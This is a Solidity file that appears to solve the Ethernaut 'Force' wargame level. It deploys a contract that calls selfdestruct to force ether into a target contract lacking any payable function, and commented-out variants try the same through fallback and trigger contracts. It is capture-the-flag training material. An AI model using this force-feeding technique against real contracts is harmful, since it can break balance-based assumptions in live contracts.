// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Force {
    constructor() {
    }
}

// contract EthernautForce {
//     address payable instanceContractAddress;

//     constructor(address payable _instanceContractAddress) payable {
//         instanceContractAddress = _instanceContractAddress;
//     }

//     // receive() payable external {
//     //     console.log('receive() called. msg.value:');
//     //     console.log(msg.value);
//     // }

//     fallback() payable external {
//         console.log('fallback() called. msg.value:');
//         console.log(msg.value);
//         // instanceContractAddress.transfer(msg.value/2);
//         selfdestruct(instanceContractAddress);
//         // (bool success, ) = instanceContractAddress.call{value: msg.value/2, gas: 300000}("");
//     }
// }

contract EthernautForce {
    address payable instanceContractAddress;

    constructor(address payable _instanceContractAddress) payable {
        instanceContractAddress = _instanceContractAddress;
    }

    function forceEther() external payable {
        require(msg.value > 0, 'value is zero');
        selfdestruct(instanceContractAddress);

    }
}

// contract TriggerEthernautForce {
//     address payable ethernautForceAddress;

//     constructor(address payable _ethernautForceAddress) payable {
//         ethernautForceAddress = _ethernautForceAddress;
//     }

//     // function hello() external view returns (string memory) {
//     //     console.log('This comes from the smart contract');
//     //     return 'world';
//     // }

//     function triggerForce() external payable {
//         require(msg.value > 0, 'value is zero');
//         // console.log('triggerForce() called. msg.value:');
//         // console.log(msg.value);
//         // ethernautForceAddress.transfer(msg.value);
//         selfdestruct(ethernautForceAddress);
//         // ethernautForceAddress.call{value: msg.value, gas: 300000}("");
//     }

//     // receive() payable external {
//     //     console.log('receive() called. msg.value:');
//     //     console.log(msg.value);
//     // }    
// }